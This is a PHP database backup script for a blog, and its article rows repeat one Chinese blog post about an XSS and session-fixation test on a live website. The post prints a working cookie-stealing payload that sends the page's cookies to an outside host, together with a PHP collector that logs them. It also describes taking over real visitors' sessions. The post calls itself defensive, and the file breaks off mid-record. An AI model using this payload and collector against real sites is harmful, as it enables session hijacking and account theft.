<?php
/* ------------------------------------------------------ *\
   ------------------------------------------------------
   PHP Simple Library XCore 1.x-dev Database Backup File
        Create On: 2016-10-19 17:35:17
        SQL Server version: 10.1.10-MariaDB
        Host: localhost   
        Database: hello
        Tables: 13
   ------------------------------------------------------
\* ------------------------------------------------------ */

try {
/** Open Transaction Avoid Error **/
Query::beginTransaction();
 (new Query('DROP TABLE IF EXISTS #{article_tag}'))->exec();

 (new Query('CREATE TABLE `#{article_tag}` (
  `tid` bigint(20) NOT NULL,
  `aid` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{article_tag}` VALUES (\'2\',\'-23000\'),(\'3\',\'-23000\'),(\'4\',\'-23000\'),(\'2\',\'27\'),(\'3\',\'27\'),(\'4\',\'27\'),(\'2\',\'30\'),(\'3\',\'30\'),(\'4\',\'30\'),(\'2\',\'48\'),(\'3\',\'48\'),(\'4\',\'48\'),(\'2\',\'49\'),(\'3\',\'49\'),(\'4\',\'49\'),(\'2\',\'57\'),(\'3\',\'57\'),(\'4\',\'57\'),(\'2\',\'58\'),(\'3\',\'58\'),(\'4\',\'58\'),(\'5\',\'58\'),(\'2\',\'59\'),(\'3\',\'59\'),(\'4\',\'59\'),(\'5\',\'59\'),(\'2\',\'60\'),(\'3\',\'60\'),(\'4\',\'60\'),(\'5\',\'60\'),(\'2\',\'-23000\'),(\'3\',\'-23000\'),(\'4\',\'-23000\'),(\'2\',\'27\'),(\'3\',\'27\'),(\'4\',\'27\'),(\'2\',\'30\'),(\'3\',\'30\'),(\'4\',\'30\'),(\'2\',\'48\'),(\'3\',\'48\'),(\'4\',\'48\'),(\'2\',\'49\'),(\'3\',\'49\'),(\'4\',\'49\'),(\'2\',\'57\'),(\'3\',\'57\'),(\'4\',\'57\'),(\'2\',\'58\'),(\'3\',\'58\'),(\'4\',\'58\'),(\'5\',\'58\'),(\'2\',\'59\'),(\'3\',\'59\'),(\'4\',\'59\'),(\'5\',\'59\'),(\'2\',\'60\'),(\'3\',\'60\'),(\'4\',\'60\'),(\'5\',\'60\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{articles}'))->exec();

 (new Query('CREATE TABLE `#{articles}` (
  `aid` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \'ID\',
  `topic` bigint(20) NOT NULL DEFAULT \'0\' COMMENT \'话题\',
  `category` bigint(20) NOT NULL,
  `title` tinytext NOT NULL,
  `remark` tinytext NOT NULL COMMENT \'摘要\',
  `contents` text NOT NULL,
  `author` bigint(20) NOT NULL,
  `views` int(11) NOT NULL DEFAULT \'0\',
  `created` int(11) NOT NULL,
  `modified` int(11) NOT NULL,
  `keep_top` tinyint(1) NOT NULL DEFAULT \'0\' COMMENT \'置顶\',
  `replys` int(11) NOT NULL DEFAULT \'0\' COMMENT \'回复数\',
  `public` tinyint(1) NOT NULL DEFAULT \'1\',
  `allow_reply` tinyint(1) NOT NULL DEFAULT \'1\',
  `verify` tinyint(1) NOT NULL DEFAULT \'0\' COMMENT \'验证\',
  `hash` varchar(32) NOT NULL,
  PRIMARY KEY (`aid`),
  UNIQUE KEY `filemd5` (`hash`),
  KEY `topic` (`topic`),
  KEY `keep_top` (`keep_top`),
  KEY `public` (`public`),
  KEY `allow_replay` (`allow_reply`),
  KEY `verify` (`verify`),
  KEY `modified` (`modified`),
  KEY `modified_2` (`modified`),
  KEY `category` (`category`)
) ENGINE=InnoDB AUTO_INCREMENT=61 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{articles}` VALUES (\'27\',\'0\',\'1\',\'导入 PHPxSQLxImport 一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，啊哈哈，结果还是喜人的...\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
![百度的图片](/$62/baidu_jgylogo3.gif)
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)

>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'43\',\'10\',\'1466659999\',\'1466659999\',\'0\',\'0\',\'1\',\'1\',\'0\',\'\'),(\'30\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，啊哈哈，结果还是喜人的...\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
![百度的图片](/$62/baidu_jgylogo3.gif)
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)

>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'43\',\'5\',\'1466659999\',\'1466659999\',\'0\',\'0\',\'1\',\'1\',\'0\',\'411b91ee9d41e51a9c8df7cdb50b4a0a\'),(\'48\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，啊哈哈，结果还是喜人的...\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
![百度的图片](/$62/baidu_jgylogo3.gif)
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'48\',\'13\',\'1476104456\',\'1476104456\',\'0\',\'0\',\'1\',\'1\',\'0\',\'152a3363a44625c25156ad7cb786b2a7\'),(\'49\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，啊哈哈，结果还是喜人的...\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'48\',\'12\',\'1476104456\',\'1476104456\',\'0\',\'0\',\'1\',\'1\',\'0\',\'c127aabf5cc9a3aeab501783b3de32c3\'),(\'57\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，啊哈哈，结果还是喜人的...\',\'# 一次不完整的XSS混合渗透测试记录 -- Test
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'47\',\'3\',\'1476104456\',\'1476104456\',\'0\',\'0\',\'1\',\'1\',\'0\',\'16d192612bf64346a0817e5d11415770\'),(\'58\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，测试发布文档。文章zip的MD5不变则文章未改变\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
